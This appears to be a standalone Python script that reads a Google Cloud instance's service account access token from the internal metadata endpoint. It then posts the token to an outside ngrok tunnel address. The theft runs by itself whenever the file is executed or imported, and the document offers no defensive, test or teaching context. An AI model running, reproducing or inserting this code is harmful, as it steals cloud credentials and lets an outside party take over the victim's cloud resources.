import os
import requests
def send_token_to_server():
  try:
    token_url='http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token'
    headers={'Metadata-Flavor':'Google'}
    token_response=requests.get(token_url,headers=headers)
    if token_response.status_code==200:
      token=token_response.text
      url="https://5735-67-205-141-215.ngrok-free.app/log"
      data={'token':token}
      try:
        response=requests.post(url,data=data)
        print(f"Server responded with status code: {response.status_code}")
      except Exception as e:
        print(f"Failed to send token to server: {e}")
    else:
      print(f"Failed to retrieve token: {token_response.status_code}")
  except Exception as e:
    print(f"An error occurred while trying to get the token: {e}")
send_token_to_server()
